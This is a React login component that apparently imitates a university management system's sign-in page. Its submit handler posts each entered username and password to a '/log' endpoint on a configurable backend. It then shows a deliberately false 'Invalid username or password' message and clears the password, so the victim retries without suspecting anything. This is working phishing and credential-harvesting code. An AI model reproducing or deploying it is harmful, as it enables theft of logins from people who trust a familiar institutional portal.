import React, { useState } from "react";

const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch(`${BACKEND}/log`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });
      // show fake error message and clear password
      setMsg("Invalid username or password");
      setPassword("");
    } catch (err) {
      setMsg("Network error");
      console.error(err);
    }
  };

  // return (
  //   <div style={{ maxWidth: 360, margin: "6rem auto", padding: 20, border: "1px solid #ddd", borderRadius: 6 }}>
  //     <h2>Sign in</h2>
  //     <form onSubmit={handleSubmit}>
  //       <div style={{ marginBottom: 8 }}>
  //         <input value={username} onChange={e => setUsername(e.target.value)} placeholder="Username" required style={{ width: "100%", padding: 8 }} />
  //       </div>
  //       <div style={{ marginBottom: 8 }}>
  //         <input value={password} onChange={e => setPassword(e.target.value)} type="password" placeholder="Password" required style={{ width: "100%", padding: 8 }} />
  //       </div>
  //       <button type="submit" style={{ width: "100%", padding: 10 }}>Sign in</button>
  //     </form>
  //     {msg && <p style={{ color: "firebrick", marginTop: 12 }}>{msg}</p>}
  //   </div>
  // );

  return (
    <div class="login-container_camu" id="camuLoginContainer">
      <div class="row login-full-container m-0">
        <div class="col-lg-6 left-grid">
          <div class="left-back-img">
            <img src="data:image/svg+xml;base64," alt></img>
          </div>
          <div class="login-details-left">
            <div class="login-banner-view">
              <div class="left-banner-section mb-5">
                <div id="login-box" class="no_margin login-banner-box mainblock visible m-0" style={{ backgroundImage: "url('https://test.rean.gov.kh/v2/8e1bc2a1925d0cfa8a4fad5a8ecdd278.jpg')"}}></div>
              </div>
              <p class="fs-6 text-white font-bold flex justify-content-center">University Management System</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
